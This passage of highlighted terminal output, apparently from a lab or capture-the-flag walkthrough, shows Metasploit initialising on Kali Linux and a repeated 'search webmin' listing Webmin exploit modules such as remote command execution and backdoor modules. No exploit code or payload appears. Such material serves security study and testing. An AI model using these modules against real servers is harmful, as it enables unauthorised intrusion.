+</span></span><span class="line"><span class="cl"><span class="n">Creating</span> <span class="n">database</span> <span class="n">at</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/.</span><span class="n">msf4</span><span class="o">/</span><span class="n">db</span>
+</span></span><span class="line"><span class="cl"><span class="n">Creating</span> <span class="n">db</span> <span class="n">socket</span> <span class="n">file</span> <span class="n">at</span> <span class="o">/</span><span class="n">tmp</span>
+</span></span><span class="line"><span class="cl"><span class="n">Starting</span> <span class="n">database</span> <span class="n">at</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/.</span><span class="n">msf4</span><span class="o">/</span><span class="n">db</span><span class="o">...</span><span class="n">waiting</span> <span class="k">for</span> <span class="n">server</span> <span class="n">to</span> <span class="n">start</span><span class="o">....</span><span class="n">success</span>
+</span></span><span class="line"><span class="cl"><span class="n">Creating</span> <span class="n">database</span> <span class="n">users</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">embedded</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ruby</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="n">pg</span><span class="o">-</span><span class="mf">1.5</span><span class="o">.</span><span class="mi">9</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">pg</span><span class="o">/</span><span class="n">connection</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">709</span><span class="p">:</span><span class="ow">in</span> <span class="err">`</span><span class="n">async_connect_or_reset</span><span class="s1">&#39;: could not connect to server: Connection refused (PG::ConnectionBad)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Is</span> <span class="n">the</span> <span class="n">server</span> <span class="n">running</span> <span class="n">on</span> <span class="n">host</span> <span class="s2">&#34;127.0.0.1&#34;</span> <span class="ow">and</span> <span class="n">accepting</span>
+</span></span><span class="line"><span class="cl">        <span class="n">TCP</span><span class="o">/</span><span class="ne">IP</span> <span class="n">connections</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">5433</span><span class="err">?</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">embedded</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ruby</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="n">pg</span><span class="o">-</span><span class="mf">1.5</span><span class="o">.</span><span class="mi">9</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">pg</span><span class="o">/</span><span class="n">connection</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">844</span><span class="p">:</span><span class="ow">in</span> <span class="err">`</span><span class="n">connect_to_hosts</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">embedded</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ruby</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="n">pg</span><span class="o">-</span><span class="mf">1.5</span><span class="o">.</span><span class="mi">9</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">pg</span><span class="o">/</span><span class="n">connection</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">772</span><span class="p">:</span><span class="ow">in</span> <span class="err">`</span><span class="n">new</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">embedded</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ruby</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="o">/</span><span class="n">gems</span><span class="o">/</span><span class="n">pg</span><span class="o">-</span><span class="mf">1.5</span><span class="o">.</span><span class="mi">9</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">pg</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">63</span><span class="p">:</span><span class="ow">in</span> <span class="err">`</span><span class="n">connect</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">embedded</span><span class="o">/</span><span class="n">framework</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">msfdb_helpers</span><span class="o">/</span><span class="n">pg_ctl</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">159</span><span class="p">:</span><span class="ow">in</span> <span class="err">`</span><span class="n">create_db_users</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">from</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">embedded</span><span class="o">/</span><span class="n">framework</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">msfdb_helpers</span><span class="o">/</span><span class="n">pg_ctl</span><span class="o">.</span><span class="n">rb</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="ow">in</span> <span class="err">`</span><span class="n">init</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">from</span> <span class="n">msfdb</span><span class="p">:</span><span class="mi">201</span><span class="p">:</span><span class="ow">in</span> <span class="err">`</span><span class="n">init_db</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">from</span> <span class="n">msfdb</span><span class="p">:</span><span class="mi">943</span><span class="p">:</span><span class="ow">in</span> <span class="err">`</span><span class="n">invoke_command</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">from</span> <span class="n">msfdb</span><span class="p">:</span><span class="mi">1072</span><span class="p">:</span><span class="ow">in</span> <span class="err">`</span><span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="o">**</span> <span class="n">Metasploit</span> <span class="n">Framework</span> <span class="n">Initial</span> <span class="n">Setup</span> <span class="n">Complete</span> <span class="o">**</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">This</span> <span class="n">copy</span> <span class="n">of</span> <span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span> <span class="n">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">two</span> <span class="n">weeks</span> <span class="n">old</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Consider</span> <span class="n">running</span> <span class="s1">&#39;msfupdate&#39;</span> <span class="n">to</span> <span class="n">update</span> <span class="n">to</span> <span class="n">the</span> <span class="n">latest</span> <span class="n">version</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">done</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="n">started</span>
+</span></span><span class="line"><span class="cl"><span class="n">Metasploit</span> <span class="n">tip</span><span class="p">:</span> <span class="n">Open</span> <span class="n">an</span> <span class="n">interactive</span> <span class="n">Ruby</span> <span class="n">terminal</span> <span class="n">with</span> <span class="n">irb</span>
+</span></span><span class="line"><span class="cl">                                                  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Unable</span> <span class="n">to</span> <span class="n">handle</span> <span class="n">kernel</span> <span class="n">NULL</span> <span class="n">pointer</span> <span class="n">dereference</span> <span class="n">at</span> <span class="n">virtual</span> <span class="n">address</span> <span class="mh">0xd34db33f</span>                                
+</span></span><span class="line"><span class="cl"><span class="n">EFLAGS</span><span class="p">:</span> <span class="mi">00010046</span>                                                                                              
+</span></span><span class="line"><span class="cl"><span class="n">eax</span><span class="p">:</span> <span class="mi">00000001</span> <span class="n">ebx</span><span class="p">:</span> <span class="n">f77c8c00</span> <span class="n">ecx</span><span class="p">:</span> <span class="mi">00000000</span> <span class="n">edx</span><span class="p">:</span> <span class="n">f77f0001</span>                                                       
+</span></span><span class="line"><span class="cl"><span class="n">esi</span><span class="p">:</span> <span class="mi">803</span><span class="n">bf014</span> <span class="n">edi</span><span class="p">:</span> <span class="mi">8023</span><span class="n">c755</span> <span class="n">ebp</span><span class="p">:</span> <span class="mi">80237</span><span class="n">f84</span> <span class="n">esp</span><span class="p">:</span> <span class="mi">80237</span><span class="n">f60</span>                                                       
+</span></span><span class="line"><span class="cl"><span class="n">ds</span><span class="p">:</span> <span class="mi">0018</span>   <span class="n">es</span><span class="p">:</span> <span class="mi">0018</span>  <span class="n">ss</span><span class="p">:</span> <span class="mi">0018</span>                                                                                 
+</span></span><span class="line"><span class="cl"><span class="n">Process</span> <span class="n">Swapper</span> <span class="p">(</span><span class="n">Pid</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">process</span> <span class="n">nr</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="n">stackpage</span><span class="o">=</span><span class="mi">80377000</span><span class="p">)</span>                                                   
+</span></span><span class="line"><span class="cl">                                                                                                              
+</span></span><span class="line"><span class="cl">                                                                                                              
+</span></span><span class="line"><span class="cl"><span class="n">Stack</span><span class="p">:</span> <span class="mi">90909090990909090990909090</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="mi">90909090990909090990909090</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="mf">90909090.90909090</span><span class="o">.</span><span class="mi">90909090</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="mf">90909090.90909090</span><span class="o">.</span><span class="mi">90909090</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="mf">90909090.90909090</span><span class="o">.</span><span class="mi">09090900</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="mf">90909090.90909090</span><span class="o">.</span><span class="mi">09090900</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="o">..........................</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">cccccccccccccccccccccccccc</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">cccccccccccccccccccccccccc</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">ccccccccc</span><span class="o">.................</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">cccccccccccccccccccccccccc</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">cccccccccccccccccccccccccc</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="o">.................</span><span class="n">ccccccccc</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">cccccccccccccccccccccccccc</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">cccccccccccccccccccccccccc</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="o">..........................</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">ffffffffffffffffffffffffff</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">ffffffff</span><span class="o">..................</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">ffffffffffffffffffffffffff</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">ffffffff</span><span class="o">..................</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">ffffffff</span><span class="o">..................</span>                                                                             
+</span></span><span class="line"><span class="cl">       <span class="n">ffffffff</span><span class="o">..................</span>                                                                             
+</span></span><span class="line"><span class="cl">                                                                                                              
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Code</span><span class="p">:</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="n">M3</span> <span class="n">T4</span> <span class="n">SP</span> <span class="n">L0</span> <span class="mi">1</span><span class="n">T</span> <span class="n">FR</span> <span class="mi">4</span><span class="n">M</span> <span class="mi">3</span><span class="n">W</span> <span class="n">OR</span> <span class="n">K</span><span class="o">!</span> <span class="n">V3</span> <span class="n">R5</span> <span class="n">I0</span> <span class="n">N5</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+</span></span><span class="line"><span class="cl"><span class="n">Aiee</span><span class="p">,</span> <span class="n">Killing</span> <span class="n">Interrupt</span> <span class="n">handler</span>
+</span></span><span class="line"><span class="cl"><span class="n">Kernel</span> <span class="n">panic</span><span class="p">:</span> <span class="n">Attempted</span> <span class="n">to</span> <span class="n">kill</span> <span class="n">the</span> <span class="n">idle</span> <span class="n">task</span><span class="o">!</span>
+</span></span><span class="line"><span class="cl"><span class="n">In</span> <span class="n">swapper</span> <span class="n">task</span> <span class="o">-</span> <span class="ow">not</span> <span class="n">syncing</span>                                                                                 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="o">=</span><span class="p">[</span> <span class="n">metasploit</span> <span class="n">v6</span><span class="o">.</span><span class="mf">4.44</span><span class="o">-</span><span class="n">dev</span><span class="o">-</span>                         <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="o">--</span> <span class="o">--=</span><span class="p">[</span> <span class="mi">2484</span> <span class="n">exploits</span> <span class="o">-</span> <span class="mi">1280</span> <span class="n">auxiliary</span> <span class="o">-</span> <span class="mi">393</span> <span class="n">post</span>       <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="o">--</span> <span class="o">--=</span><span class="p">[</span> <span class="mi">1463</span> <span class="n">payloads</span> <span class="o">-</span> <span class="mi">49</span> <span class="n">encoders</span> <span class="o">-</span> <span class="mi">13</span> <span class="n">nops</span>           <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">+</span> <span class="o">--</span> <span class="o">--=</span><span class="p">[</span> <span class="mi">9</span> <span class="n">evasion</span>                                       <span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Metasploit</span> <span class="n">Documentation</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="o">.</span><span class="n">metasploit</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="n">search</span> <span class="n">webmin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Matching</span> <span class="n">Modules</span>
+</span></span><span class="line"><span class="cl"><span class="o">================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">#   Name                                           Disclosure Date  Rank       Check  Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">-</span>   <span class="o">----</span>                                           <span class="o">---------------</span>  <span class="o">----</span>       <span class="o">-----</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">webmin_show_cgi_exec</span>       <span class="mi">2012</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">06</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="o">/</span><span class="n">file</span><span class="o">/</span><span class="n">show</span><span class="o">.</span><span class="n">cgi</span> <span class="n">Remote</span> <span class="n">Command</span> <span class="n">Execution</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">1</span>   <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">file_disclosure</span>         <span class="mi">2006</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">30</span>       <span class="n">normal</span>     <span class="n">No</span>     <span class="n">Webmin</span> <span class="ne">File</span> <span class="n">Disclosure</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">2</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_file_manager_rce</span>     <span class="mi">2022</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">26</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="ne">File</span> <span class="n">Manager</span> <span class="n">RCE</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">3</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_package_updates_rce</span>  <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">26</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="n">Package</span> <span class="n">Updates</span> <span class="n">RCE</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">4</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Unix</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span>                    <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">5</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Linux</span> <span class="n">Dropper</span> <span class="p">(</span><span class="n">x86</span> <span class="o">&amp;</span> <span class="n">x64</span><span class="p">)</span>         <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">6</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Linux</span> <span class="n">Dropper</span> <span class="p">(</span><span class="n">ARM64</span><span class="p">)</span>             <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">7</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_packageup_rce</span>        <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">16</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="n">Package</span> <span class="n">Updates</span> <span class="n">Remote</span> <span class="n">Command</span> <span class="n">Execution</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">8</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">webmin_upload_exec</span>         <span class="mi">2019</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">17</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="n">Upload</span> <span class="n">Authenticated</span> <span class="n">RCE</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">9</span>   <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">edit_html_fileaccess</span>    <span class="mi">2012</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">06</span>       <span class="n">normal</span>     <span class="n">No</span>     <span class="n">Webmin</span> <span class="n">edit_html</span><span class="o">.</span><span class="n">cgi</span> <span class="n">file</span> <span class="n">Parameter</span> <span class="n">Traversal</span> <span class="n">Arbitrary</span> <span class="ne">File</span> <span class="n">Access</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">10</span>  <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span>             <span class="mi">2019</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">10</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="n">password_change</span><span class="o">.</span><span class="n">cgi</span> <span class="n">Backdoor</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">11</span>    \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Automatic</span> <span class="p">(</span><span class="n">Unix</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span><span class="p">)</span>        <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">12</span>    \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Automatic</span> <span class="p">(</span><span class="n">Linux</span> <span class="n">Dropper</span><span class="p">)</span>         <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Interact</span> <span class="n">with</span> <span class="n">a</span> <span class="n">module</span> <span class="n">by</span> <span class="n">name</span> <span class="ow">or</span> <span class="n">index</span><span class="o">.</span> <span class="n">For</span> <span class="n">example</span> <span class="n">info</span> <span class="mi">12</span><span class="p">,</span> <span class="n">use</span> <span class="mi">12</span> <span class="ow">or</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span>
+</span></span><span class="line"><span class="cl"><span class="n">After</span> <span class="n">interacting</span> <span class="n">with</span> <span class="n">a</span> <span class="n">module</span> <span class="n">you</span> <span class="n">can</span> <span class="n">manually</span> <span class="n">set</span> <span class="n">a</span> <span class="n">TARGET</span> <span class="n">with</span> <span class="n">set</span> <span class="n">TARGET</span> <span class="s1">&#39;Automatic (Linux Dropper)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Unknown</span> <span class="n">command</span><span class="p">:</span> <span class="mf">10.</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">help</span> <span class="n">command</span> <span class="k">for</span> <span class="n">more</span> <span class="n">details</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">msf6</span> <span class="o">&gt;</span> <span class="n">search</span> <span class="n">webmin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Matching</span> <span class="n">Modules</span>
+</span></span><span class="line"><span class="cl"><span class="o">================</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">#   Name                                           Disclosure Date  Rank       Check  Description</span>
+</span></span><span class="line"><span class="cl">   <span class="o">-</span>   <span class="o">----</span>                                           <span class="o">---------------</span>  <span class="o">----</span>       <span class="o">-----</span>  <span class="o">-----------</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">0</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">webmin_show_cgi_exec</span>       <span class="mi">2012</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">06</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="o">/</span><span class="n">file</span><span class="o">/</span><span class="n">show</span><span class="o">.</span><span class="n">cgi</span> <span class="n">Remote</span> <span class="n">Command</span> <span class="n">Execution</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">1</span>   <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">file_disclosure</span>         <span class="mi">2006</span><span class="o">-</span><span class="mi">06</span><span class="o">-</span><span class="mi">30</span>       <span class="n">normal</span>     <span class="n">No</span>     <span class="n">Webmin</span> <span class="ne">File</span> <span class="n">Disclosure</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">2</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_file_manager_rce</span>     <span class="mi">2022</span><span class="o">-</span><span class="mi">02</span><span class="o">-</span><span class="mi">26</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="ne">File</span> <span class="n">Manager</span> <span class="n">RCE</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">3</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_package_updates_rce</span>  <span class="mi">2022</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">26</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="n">Package</span> <span class="n">Updates</span> <span class="n">RCE</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">4</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Unix</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span>                    <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">5</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Linux</span> <span class="n">Dropper</span> <span class="p">(</span><span class="n">x86</span> <span class="o">&amp;</span> <span class="n">x64</span><span class="p">)</span>         <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">6</span>     \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Linux</span> <span class="n">Dropper</span> <span class="p">(</span><span class="n">ARM64</span><span class="p">)</span>             <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">7</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_packageup_rce</span>        <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">16</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="n">Package</span> <span class="n">Updates</span> <span class="n">Remote</span> <span class="n">Command</span> <span class="n">Execution</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">8</span>   <span class="n">exploit</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">webapp</span><span class="o">/</span><span class="n">webmin_upload_exec</span>         <span class="mi">2019</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">17</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="n">Upload</span> <span class="n">Authenticated</span> <span class="n">RCE</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">9</span>   <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">webmin</span><span class="o">/</span><span class="n">edit_html_fileaccess</span>    <span class="mi">2012</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">06</span>       <span class="n">normal</span>     <span class="n">No</span>     <span class="n">Webmin</span> <span class="n">edit_html</span><span class="o">.</span><span class="n">cgi</span> <span class="n">file</span> <span class="n">Parameter</span> <span class="n">Traversal</span> <span class="n">Arbitrary</span> <span class="ne">File</span> <span class="n">Access</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">10</span>  <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span>             <span class="mi">2019</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">10</span>       <span class="n">excellent</span>  <span class="n">Yes</span>    <span class="n">Webmin</span> <span class="n">password_change</span><span class="o">.</span><span class="n">cgi</span> <span class="n">Backdoor</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">11</span>    \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Automatic</span> <span class="p">(</span><span class="n">Unix</span> <span class="n">In</span><span class="o">-</span><span class="n">Memory</span><span class="p">)</span>        <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">   <span class="mi">12</span>    \<span class="n">_</span> <span class="n">target</span><span class="p">:</span> <span class="n">Automatic</span> <span class="p">(</span><span class="n">Linux</span> <span class="n">Dropper</span><span class="p">)</span>         <span class="o">.</span>                <span class="o">.</span>          <span class="o">.</span>      <span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Interact</span> <span class="n">with</span> <span class="n">a</span> <span class="n">module</span> <span class="n">by</span> <span class="n">name</span> <span class="ow">or</span> <span class="n">index</span><span class="o">.</span> <span class="n">For</span> <span class="n">example</span> <span class="n">info</span> <span class="mi">12</span><span class="p">,</span> <span class="n">use</span> <span class="mi">12</span> <span class="ow">or</span> <span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">linux</span><span class="o">/</span><span class="n">http</span><span class="o">/</span><span class="n">webmin_backdoor</span>
